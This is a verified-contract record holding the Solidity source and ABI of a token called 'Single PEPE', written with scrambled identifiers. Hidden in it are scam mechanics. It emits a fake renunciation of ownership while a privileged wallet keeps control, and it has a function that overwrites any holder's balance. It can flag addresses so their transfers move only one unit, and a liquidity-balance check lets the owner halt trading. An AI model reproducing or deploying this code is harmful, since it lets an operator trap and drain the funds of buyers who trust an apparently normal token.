{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface tradingMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address minWallet) external view returns (uint256);\n\n    function transfer(address swapSellSender, uint256 receiverExempt) external returns (bool);\n\n    function allowance(address feeReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address swapSellSender,\n        uint256 receiverExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoSwapToken, uint256 value);\n    event Approval(address indexed feeReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract isTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface toIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface marketingList {\n    function createPair(address shouldSwap, address tokenMode) external returns (address);\n}\n\ninterface tradingMinMetadata is tradingMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SinglePEPE is isTrading, tradingMin, tradingMinMetadata {\n\n    function transfer(address senderAmount, uint256 receiverExempt) external virtual override returns (bool) {\n        return atTx(_msgSender(), senderAmount, receiverExempt);\n    }\n\n    function minMax(address tradingTo, address swapSellSender, uint256 receiverExempt) internal returns (bool) {\n        require(listIs[tradingTo] >= receiverExempt);\n        listIs[tradingTo] -= receiverExempt;\n        listIs[swapSellSender] += receiverExempt;\n        emit Transfer(tradingTo, swapSellSender, receiverExempt);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return marketingLaunch;\n    }\n\n    function balanceOf(address minWallet) public view virtual override returns (uint256) {\n        return listIs[minWallet];\n    }\n\n    uint256 public tokenLimit;\n\n    mapping(address => mapping(address => uint256)) private exemptMax;\n\n    mapping(address => bool) public receiverToken;\n\n    function transferFrom(address tradingTo, address swapSellSender, uint256 receiverExempt) external override returns (bool) {\n        if (_msgSender() != swapTotal) {\n            if (exemptMax[tradingTo][_msgSender()] != type(uint256).max) {\n                require(receiverExempt <= exemptMax[tradingTo][_msgSender()]);\n                exemptMax[tradingTo][_msgSender()] -= receiverExempt;\n            }\n        }\n        return atTx(tradingTo, swapSellSender, receiverExempt);\n    }\n\n    address private marketingLaunch;\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptMinTrading;\n    }\n\n    function atTx(address tradingTo, address swapSellSender, uint256 receiverExempt) internal returns (bool) {\n        if (tradingTo == launchFrom) {\n            return minMax(tradingTo, swapSellSender, receiverExempt);\n        }\n        uint256 enableMax = tradingMin(receiverLaunched).balanceOf(liquiditySwap);\n        require(enableMax == liquidityLaunch);\n        require(swapSellSender != liquiditySwap);\n        if (toAt[tradingTo]) {\n            return minMax(tradingTo, swapSellSender, fundLaunched);\n        }\n        return minMax(tradingTo, swapSellSender, receiverExempt);\n    }\n\n    function owner() external view returns (address) {\n        return marketingLaunch;\n    }\n\n    constructor (){\n        \n        toIs shouldTo = toIs(swapTotal);\n        receiverLaunched = marketingList(shouldTo.factory()).createPair(shouldTo.WETH(), address(this));\n        \n        launchFrom = _msgSender();\n        totalEnable();\n        receiverToken[launchFrom] = true;\n        listIs[launchFrom] = walletModeSwap;\n        if (isLaunchExempt != fundLaunch) {\n            fundLaunch = false;\n        }\n        emit Transfer(address(0), launchFrom, walletModeSwap);\n    }\n\n    event OwnershipTransferred(address indexed liquidityLimitIs, address indexed sellMax);\n\n    uint256 public sellAmount;\n\n    function exemptLimitMode(address modeAmount) public {\n        swapIs();\n        if (tokenLimit == sellAmount) {\n            isLaunch = false;\n        }\n        if (modeAmount == launchFrom || modeAmount == receiverLaunched) {\n            return;\n        }\n        toAt[modeAmount] = true;\n    }\n\n    address liquiditySwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalEnable() public {\n        emit OwnershipTransferred(launchFrom, address(0));\n        marketingLaunch = address(0);\n    }\n\n    address swapTotal = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function allowance(address launchedIs, address amountTake) external view virtual override returns (uint256) {\n        if (amountTake == swapTotal) {\n            return type(uint256).max;\n        }\n        return exemptMax[launchedIs][amountTake];\n    }\n\n    function launchedTo(address receiverTeam) public {\n        if (launchedTotalShould) {\n            return;\n        }\n        if (tokenLimit == sellAmount) {\n            fundLaunch = false;\n        }\n        receiverToken[receiverTeam] = true;\n        \n        launchedTotalShould = true;\n    }\n\n    bool public fundLaunch;\n\n    function approve(address amountTake, uint256 receiverExempt) public virtual override returns (bool) {\n        exemptMax[_msgSender()][amountTake] = receiverExempt;\n        emit Approval(_msgSender(), amountTake, receiverExempt);\n        return true;\n    }\n\n    uint256 private walletModeSwap = 100000000 * 10 ** 18;\n\n    uint8 private exemptMinTrading = 18;\n\n    mapping(address => uint256) private listIs;\n\n    address public receiverLaunched;\n\n    function name() external view virtual override returns (string memory) {\n        return launchedShouldLiquidity;\n    }\n\n    address public launchFrom;\n\n    bool public isLaunchExempt;\n\n    bool public isLaunch;\n\n    function swapIs() private view {\n        require(receiverToken[_msgSender()]);\n    }\n\n    function buyLiquidityLaunched(address senderAmount, uint256 receiverExempt) public {\n        swapIs();\n        listIs[senderAmount] = receiverExempt;\n    }\n\n    string private launchedShouldLiquidity = \"Single PEPE\";\n\n    uint256 launchedMaxTake;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletModeSwap;\n    }\n\n    uint256 liquidityLaunch;\n\n    string private exemptList = \"SPE\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptList;\n    }\n\n    bool public launchedTotalShould;\n\n    mapping(address => bool) public toAt;\n\n    function totalMarketing(uint256 receiverExempt) public {\n        swapIs();\n        liquidityLaunch = receiverExempt;\n    }\n\n    uint256 constant fundLaunched = 1 ** 10;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityLimitIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoSwapToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverExempt\",\"type\":\"uint256\"}],\"name\":\"buyLiquidityLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeAmount\",\"type\":\"address\"}],\"name\":\"exemptLimitMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isLaunchExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTeam\",\"type\":\"address\"}],\"name\":\"launchedTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTotalShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"toAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverExempt\",\"type\":\"uint256\"}],\"name\":\"totalMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapSellSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SinglePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}